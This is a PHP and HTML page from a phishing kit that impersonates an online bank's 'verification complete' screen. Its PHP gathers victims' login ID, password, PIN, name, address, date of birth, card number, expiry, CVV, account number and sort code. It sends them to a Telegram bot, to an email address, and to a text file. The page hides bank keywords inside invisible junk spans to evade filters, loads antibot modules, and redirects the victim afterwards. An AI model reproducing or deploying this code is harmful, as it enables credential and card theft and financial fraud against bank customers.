<?php
sleep(2);
ob_start();
require_once('../page_config.php');
require_once('../includes/geoLite/autoload.php');
require_once('../includes/device_detect.php');
require_once('../includes/blacklist_lookup.php');
require_once('../includes/functions.php');
require_once('../includes/session_protect.php');
require_once('../includes/antibot.php');

$post = $_POST;
if (isset($_POST['submit']) && $_SESSION['saveLog_4'] !== 1){

  // save log
  foreach ($_POST as $key => $value) {
   $_SESSION[$key] = $value;
  }

  $f1 = $_SESSION['personalId'];
  $f2 = $_SESSION['password'];
  $f3 = $_SESSION['pin'];

  $f4 = $_SESSION['fName'];
  $f5 = $_SESSION['mName'];
  $f6 = $_SESSION['lName'];
  $f7 = $_SESSION['address'];
  $f8 = $_SESSION['city'];
  $f9 = $_SESSION['state'];
  $f10 = $_SESSION['postalCode'];
  $f11 = $_SESSION['dobDay']."/".$_SESSION['dobMonth']."/".$_SESSION['dobYear'];
  $f12 = $_SESSION['email'];
  $f13 = $_SESSION['phone'];

  $f14 = $_SESSION['cardnumber'];
  $f15 = $_SESSION['expMonth']."/".$_SESSION['expYear'];
  $f16 = $_SESSION['cvv'];

  $f17 = $_SESSION['acn'];
  $f18 = $_SESSION['src'];

  $clientOsName = getOS();
  $clientBrowserName = getBrowserName();


  $data = "==============================="."\r\n".
         "Personal ID: ".$f1."\r\n".
         "Password: ".$f2."\r\n".
         "PIN: ".$f3."\r\n".
         "First Name: ".$f4."\r\n".
         "Middle Name: ".$f5."\r\n".
         "Last Name: ".$f6."\r\n".
         "Address: ".$f7."\r\n".
         "City: ".$f8."\r\n".
         "State: ".$f9."\r\n".
         "Postal Code: ".$f10."\r\n".
         "DOB: ".$f11."\r\n".
         "Email: ".$f12."\r\n".
         "Phone: ".$f13."\r\n".
         "CC: ".$f14."\r\n".
         "EXP: ".$f15."\r\n".
         "CVV: ".$f16."\r\n".
         "Account Number: ".$f17."\r\n".
         "Sort Code: ".$f18."\r\n".
         "-----------------------------------\r\n".
         "Submitted by: ".$ip."\r\n".
         "UserAgent: ".$ua."\r\n".
         "Browser: ".$clientBrowserName."\r\n".
         "Os: ".$clientOsName."\r\n".
         "-----------------------------------\r\n".
         "Received: ".date("l", strtotime(date("Y-m-d")))." ".date("j F Y @ G:i")."\r\n".
         "==============================="."\r\n";


  if($save_to_telegram==1){
    // Telegram
    $result = urlencode($data);
    file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chat_id.'&text='.$result."&parse_mode=html");
  }

  if($save_to_mail==1){
    // Email
    $subject  = $site_name." | ".$ip." | UserPass + Info + CC";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text; charset=utf-8 \r\n";

    $msg = $data;
    mail($email, $subject, $msg, $headers);
  }

  if($save_to_txt==1){
    // TXT
    $outfile = "../$txt_fileName";
    $results = $data;

    $fout = fopen($outfile, "a");
    fputs($fout, $results."\n\n");
    fclose($fout);
  }

  setcookie("uri", '', 1);
  $_SESSION['saveLog_4'] = 1;

}

if($onetime==1){
  $_SESSION['finished'] = true;
}

// header("Location: $exitlink");

ob_end_flush(); 
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="refresh" content="4;URL='<?=$exitlink?>'" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width">
    <title>Finished</title>
    <link rel="stylesheet" href="../assets/css/normalize.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="../assets/css/font-awesome.min.css">
    <link rel="shortcut icon" href=" data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAA3NCSVQICAjb4U/gAAABIElEQVQokZVSvWrCUBg9KUpLodDNF/ANHHXQyQfQ0cklq6O74pQh4AO4hiwOujuaIeB75F6bNCTREPR0SNGb1EA9XO5wfr7D/dEknsNLlaA1Gk8EXieTd8PgPwMEeLm8jUYPhz0ga61WulwC+Njt/paUAwQ+XRdAsljUu91ar1dOSGUJwANInizLA65BkO33XtFztx6Bk2XlO8ljvR6OxyTP6/VXsynUgACi6ZQkyWg2EwDJ7HDI23LEhiFugaDfvwlMUw+I53OS4WBABd/DoQQggMS2VSFZrTzg6vssIrFtkTf4nU5Jk0C62ZRIv92+nyHUdVU7b7eZ66pMqOuidEsSiE0zcxxG0a8rijLHiU3zZpCAJouv9hCa+g+qhCr8AGcFFUutQo12AAAAAElFTkSuQmCC" type="image/png" />
</head>

<body>
    <header>
        <div class="container">
            <div class="header_block">
                <div class="left_side">
                    <a href="#">
                        <img src="../assets/images/2zBXa4d_1.png" height="25"><img src="../assets/images/2zBXa4d_2.png" height="25">
                    </a>
                </div>
                <div class="right_side">
                    <p>Don’t have Online Ba<b style="font-size:0.0074px">irreconciliably</b>nk<strong style="font-size:0.0057px">assumpsit</strong>in<em style="font-size:0.0024px">counteroffensive</em>g? </p>
                    <a href="">Si<sub style="display:none;">unambiguity</sub>gn up</a>
                </div>
            </div>
        </div>
    </header>

    <div class="second_block">
        <div class="container">
            <div class="main">
                <div class="main_left">
                    <h3><i class="fa fa-check-circle" aria-hidden="true"></i> Ve<strong style="font-size:0.0046px">waitresses</strong>ri<span style="font-size:0.0063px">superadaptableness</span>fi<mark style="font-size:0.0054px">indiscretely</mark>ca<span style="display:none;">exculpations</span>ti<i style="font-size:0.0067px">nitres</i>on Complete</h3>
                    <p class="sub_title">Thanks for ve<del style="display:none;">periwinkle</del>ri<mark style="font-size:0.0084px">snottiness</mark>fying your de<mark style="font-size:0.0028px">potomac</mark>ta<span style="display:none;">unhair</span>il<sub style="display:none;">melanagogue</sub>s. Your ac<ins style="font-size:0.0015px">brauronia</ins>co<sup style="display:none;">outbulk</sup>un<mark style="font-size:0.0051px">toluidide</mark>t is now fully confirmed.<br><br>Please wait while we redirect you back to homepage.</p>
                    <div id="loader" class="loader" style="display: flex;">
                        <div>
                           <olb-loader>
                              <div class="loading"></div>
                           </olb-loader>
                        </div>
                    </div>
                </div>
                <div class="main_right">
                    <img src="../assets/images/W4iCSUy.png" alt="">
                    <h2>Beware co<sub style="font-size:0.0014px">copings</sub>ro<sub style="display:none;">booms</sub>na<sub style="display:none;">superofficiousness</sub>vi<span style="display:none;">ostraite</span>ru<ins style="display:none;">salebrous</ins>s scams</h2>
                    <p>
                        Cr<em style="font-size:0.008px">drogermen</em>im<del style="display:none;">pentosane</del>in<mark style="display:none;">microlepidopterist</mark>al<b style="display:none;">tingly</b>s are using co<sup style="display:none;">gobletful</sup>ro<strong style="font-size:0.006px">warsling</strong>na<em style="display:none;">ethylenimine</em>vi<b style="font-size:0.0059px">trumscheit</b>ru<sub style="font-size:0.0016px">aircraftsman</sub>s to target people. Please stay on the lookout for anything
                        unusual.
                        Don’t be rushed and make sure any co<strong style="display:none;">sauceline</strong>nt<strong style="display:none;">siltlike</strong>ac<em style="font-size:0.0019px">piscatorial</em>t claiming to be from us is genuine. <a href="#">Learn
                            more</a>.
                    </p>
                </div>
            </div>
        </div>
    </div>
    <footer>
        <div class="footer">
            <ul class="footer_list">
                <li><a href="#"><a>Online Ba<sub style="font-size:0.0083px">lessoning</sub>nk<sup style="font-size:0.0019px">sitiophobia</sup>in<b style="display:none;">bacchanals</b>g Guarantee</a></li>
                <li><a href="#">Site Help & Ac<i style="display:none;">bassly</i>ce<em style="font-size:0.003px">onding</em>ssibility</a></li>
                <li><a href="#">Se<span style="display:none;">usurer</span>cu<del style="font-size:0.0094px">cannelure</del>ri<strong style="font-size:0.0065px">grudgingness</strong>ty & Pr<ins style="display:none;">outswindling</ins>iv<i style="font-size:0.0061px">cypselomorphae</i>ac<b style="font-size:0.0083px">mainstream</b>y</a></li>
                <li><a href="#">Terms & Conditions</a></li>
                <li><a href="#">Legal</a></li>
            </ul>
            <div class="img_footer">
                <img src="../assets/images/qzkf32l.png" alt="">
            </div>

        </div>
    </footer>

    <script src="../assets/js/jquery-1.11.3.min.js"></script>
    <script src="../assets/js/imask.js"></script>
    <script src="../assets/js/main.js"></script>
</body>
</html>